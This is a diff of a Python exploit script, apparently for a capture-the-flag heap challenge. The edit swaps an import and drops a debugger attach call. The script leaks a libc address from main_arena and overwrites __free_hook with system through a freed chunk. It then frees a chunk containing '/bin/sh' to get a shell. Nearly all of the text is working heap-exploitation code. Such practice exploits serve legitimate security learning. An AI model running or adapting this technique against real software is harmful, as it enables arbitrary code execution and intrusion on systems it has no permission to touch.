@@ -1,10 +1,9 @@
 from helper import *
 from helper.heap import heap_helper
-import time
+from helper.load import *
 
 def new(size,con):
     info(f"new {size} {con}")
-
     sla(": ",'1')
     sla("size: \n",size)
     sla("Content: ",con)
@@ -35,7 +34,8 @@ free(0);show(0)
 heap = heap_helper(libc, 'main_arena', leak()-96)
 edit(2, p64(heap.free_hook))
 new(0x70, b"/bin/sh\x00");new(0x70, p64(heap.system))
-attach()
 free(2)
 
 shell()
+
+
